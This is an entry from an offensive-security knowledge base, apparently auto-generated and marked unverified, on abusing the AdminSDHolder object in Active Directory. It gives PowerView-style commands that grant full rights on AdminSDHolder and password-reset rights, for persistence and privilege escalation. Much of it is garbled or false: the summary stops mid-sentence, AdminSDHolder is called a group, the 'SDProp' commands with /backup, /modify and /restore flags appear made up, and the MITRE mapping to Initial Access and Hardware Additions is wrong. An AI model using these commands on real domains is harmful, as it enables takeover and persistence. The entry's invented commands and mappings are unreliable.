---
id: 9b6cf7c4-f65f-4271-a3f1-7474fd19e3a5
name: AdminSDHolder Group Rights Abuse
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:06.441626+00:00'
updated_at: '2023-04-10T20:26:37.603977+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Hardware Additions|T1200 - Hardware Additions]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Active Directory Groups]]'
- '[[AdminSDHolder Abuse]]'
commands:
- '[[Add user to AdminSDHolder group]]'
- '[[Give all rights]]'
- '[[Modifying security descriptor]]'
- '[[Reset password for toto using the account titi]]'
- '[[Restoring previous security descriptor]]'
- '[[Viewing current security descriptor]]'
---

# AdminSDHolder Group Rights Abuse

## Summary

AdminSDHolder is a special security descriptor that is applied to the built-in Administrator and Domain Administrator Active Directory groups. This security descriptor is designed to protect these groups from modification by other privileged users. However, this security descriptor can be abused by

## Description

# Description

AdminSDHolder is a special security descriptor that is applied to the built-in Administrator and Domain Administrator Active Directory groups. This security descriptor is designed to protect these groups from modification by other privileged users. However, this security descriptor can be abused by an attacker to grant themselves elevated permissions. By adding a user to the AdminSDHolder group and granting them rights, an attacker can escalate their privileges and maintain persistence. This attack is particularly dangerous as it can allow an attacker to bypass security controls and gain access to sensitive data.

## Requirements

1. Valid credentials with permission to modify Active Directory groups

1. Access to the targeted system's Active Directory

1. Knowledge of the AdminSDHolder group and its function

## Defense

1. Monitor changes to the AdminSDHolder group and its members

1. Implement the principle of least privilege to limit the impact of any potential attack

1. Regularly review and update Active Directory permissions to ensure they are appropriate and necessary

## Objectives

1. Escalate privileges to gain access to sensitive data

1. Maintain persistence on the targeted system

# Instructions

1. Use the SDProp command to push a permission template to all protected accounts automatically.

**Code**: [[SDProp]]

> This command is used to push a permission template to all protected accounts without requiring any manual intervention. The template will be automatically pushed to all accounts that are currently protected. The command takes no arguments and will run automatically once executed.

**Command** ([[Viewing current security descriptor]]):

```bash
SDProp /backup /quiet
```

**Command** ([[Modifying security descriptor]]):

```bash
SDProp /modify /quiet
```

**Command** ([[Restoring previous security descriptor]]):

```bash
SDProp /restore /quiet
```

2. To add a user to the AdminSDHolder group and grant them rights, follow these steps:
1. Open PowerShell.
2. Copy and paste the provided code into the PowerShell console.
3. Replace 'username' with the name of the user you want to add to the AdminSDHolder group.
4. Replace 'toto' with the name of the user you want to grant rights to.
5. Replace 'titi' with the name of the account you want to use to grant rights to the user.
6. Press Enter to run the command.

**Code**: [[# Add a user to the AdminSDHolder group:
Add-Domai]]

> This command adds a user to the AdminSDHolder group, which is a protected group in Active Directory that governs the permissions for other protected groups. It also grants the specified user the ability to reset the password for the 'toto' account using the 'titi' account. Finally, it grants the user all rights to the 'CN=AdminSDHolder,CN=System' object in Active Directory. The -Verbose flag is used to provide additional information about the execution of the command.

**Command** ([[Add user to AdminSDHolder group]]):

```bash
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose
```

**Command** ([[Reset password for toto using the account titi]]):

```bash
Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword
```

**Command** ([[Give all rights]]):

```bash
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
```

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Hardware Additions|T1200 - Hardware Additions]]

## Commands Used

- [[Add user to AdminSDHolder group]]
- [[Give all rights]]
- [[Modifying security descriptor]]
- [[Reset password for toto using the account titi]]
- [[Restoring previous security descriptor]]
- [[Viewing current security descriptor]]

## Tags

- [[Active Directory Attacks]]
- [[Active Directory Groups]]
- [[AdminSDHolder Abuse]]
